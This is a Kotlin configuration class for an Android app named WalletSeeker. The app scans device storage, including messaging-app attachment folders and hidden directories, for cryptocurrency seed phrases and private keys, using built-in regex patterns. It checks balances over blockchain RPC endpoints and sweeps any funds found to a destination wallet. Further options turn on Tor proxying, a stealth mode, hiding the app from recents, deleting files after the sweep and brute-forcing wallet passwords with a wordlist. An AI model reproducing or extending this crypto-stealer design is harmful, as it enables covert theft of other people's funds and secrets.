package com.hackerai.walletseeker.domain

import com.google.gson.Gson
import com.google.gson.reflect.TypeToken
import java.io.File

data class AppConfig(
    // Ścieżki skanowania
    val scanPaths: MutableList<String> = mutableListOf(
        "/storage/emulated/0",
        "/storage/emulated/0/Download",
        "/storage/emulated/0/Documents",
        "/storage/emulated/0/Android/data",
        "/storage/emulated/0/DCIM",
        "/storage/emulated/0/Pictures",
        "/storage/emulated/0/WhatsApp/Media/WhatsApp Documents",
        "/storage/emulated/0/Telegram/Telegram Documents",
        "/storage/emulated/0/Signal/Attachments",
        "/storage/emulated/0/backups",
        "/storage/emulated/0/backup"
    ),

    // Zaawansowane opcje skanowania
    val maxDepth: Int = 20,
    val maxFileSizeBytes: Long = 200 * 1024 * 1024, // 200 MB
    val scanHiddenDirectories: Boolean = true,
    val scanMediaStore: Boolean = true,
    val scanExternalApps: Boolean = true,
    val useRootAccess: Boolean = false,
    val scanOnlyNewFiles: Boolean = false,
    val lastScanTimestamp: Long = 0L,

    // Rozszerzenia plików do skanowania
    val fileExtensions: MutableList<String> = mutableListOf(
        "wallet.dat", "json", "txt", "key", "pem", "p12", "dat", "csv",
        "bak", "backup", "old", "seed", "mneo", "secret", "priv",
        "sol", "id", "wallet", "keystore", "vault", "enc", "crypt",
        "migrate", "export", "recovery", "phrase", "words", "pdf", "png", "jpg"
    ),

    // Własne patterny regex do wyszukiwania
    val searchPatterns: MutableMap<String, String> = mutableMapOf(
        "MNEMONIC_12" to """\b(?:[a-z]+ ){11}[a-z]+\b""",
        "MNEMONIC_24" to """\b(?:[a-z]+ ){23}[a-z]+\b""",
        "ETH_PRIVATE_KEY" to """0x[a-fA-F0-9]{64}""",
        "BTC_WIF" to """[5KL][1-9A-HJ-NP-Za-km-z]{51}""",
        "SOL_PRIVATE_KEY" to """\[?\d+(?:,\d+){63}\]?""",
        "TRX_PRIVATE_KEY" to """[a-fA-F0-9]{64}""",
        "XRP_SECRET" to """s[1-9A-HJ-NP-Za-km-z]{27,33}""",
        "LTC_WIF" to """[6T][1-9A-HJ-NP-Za-km-z]{51}"""
    ),

    // Serwery RPC
    val rpcEndpoints: MutableMap<String, String> = mutableMapOf(
        "ETH" to "https://eth.llamarpc.com",
        "BSC" to "https://bsc-dataseed.binance.org",
        "POLYGON" to "https://polygon-rpc.com",
        "AVAX" to "https://api.avax.network/ext/bc/C/rpc",
        "FTM" to "https://rpc.ftm.tools",
        "ARB" to "https://arb1.arbitrum.io/rpc",
        "OP" to "https://mainnet.optimism.io",
        "SOL" to "https://api.mainnet-beta.solana.com",
        "TRX" to "https://api.trongrid.io",
        "BTC" to "https://blockchain.info",
        "LTC" to "https://litecoin.nownodes.io",
        "DOGE" to "https://doge.nownodes.io",
        "XRP" to "https://xrp.nownodes.io",
        "ADA" to "https://cardano.nownodes.io"
    ),

    // Proxy
    val useTorProxy: Boolean = false,
    val proxyHost: String = "127.0.0.1",
    val proxyPort: Int = 9050,
    val useProxyForRpc: Boolean = false,

    // Sweep / Transfer
    val destinationWallet: String = "",
    val sweepGasMultiplier: Double = 1.1,
    val sweepAllTokens: Boolean = true,
    val sweepNfts: Boolean = false,
    val deleteAfterSweep: Boolean = false,
    val moveToBackupDir: Boolean = true,
    val backupDir: String = "/storage/emulated/0/WalletSeekerBackup",
    val minSweepAmountUsd: Double = 0.50,
    val maxSweepFeeUsd: Double = 100.0,

    // Bezpieczeństwo
    val encryptLocalDb: Boolean = true,
    val autoTransferEnabled: Boolean = false,
    val confirmationRequired: Boolean = true,
    val notificationOnFundsFound: Boolean = true,
    val notificationOnTransfer: Boolean = true,
    val stealthMode: Boolean = false,
    val hideFromRecents: Boolean = false,

    // API keys
    val etherscanApiKey: String = "",
    val bscscanApiKey: String = "",
    val polygonscanApiKey: String = "",
    val solscanApiKey: String = "",
    val tronGridApiKey: String = "",
    val coinGeckoApiKey: String = "",

    // Wydajność
    val parallelChecks: Int = 10,
    val retryAttempts: Int = 3,
    val requestTimeoutSeconds: Int = 30,
    val userAgent: String = "WalletSeeker/2.0",
    val customHeaders: MutableMap<String, String> = mutableMapOf(),

    // Decrypt
    val bruteForcePasswords: Boolean = true,
    val customWordlistPath: String = "/storage/emulated/0/wordlist.txt",
    val maxDecryptAttempts: Int = 10000
) {
    fun save(file: File) {
        file.parentFile?.mkdirs()
        file.writeText(Gson().toJson(this))
    }

    fun toJson(): String = Gson().toJson(this)

    companion object {
        fun load(file: File): AppConfig {
            return try {
                if (file.exists()) {
                    Gson().fromJson(file.readText(), AppConfig::class.java)
                } else {
                    AppConfig()
                }
            } catch (e: Exception) {
                AppConfig()
            }
        }

        fun fromJson(json: String): AppConfig {
            return try {
                Gson().fromJson(json, AppConfig::class.java)
            } catch (e: Exception) {
                AppConfig()
            }
        }
    }
}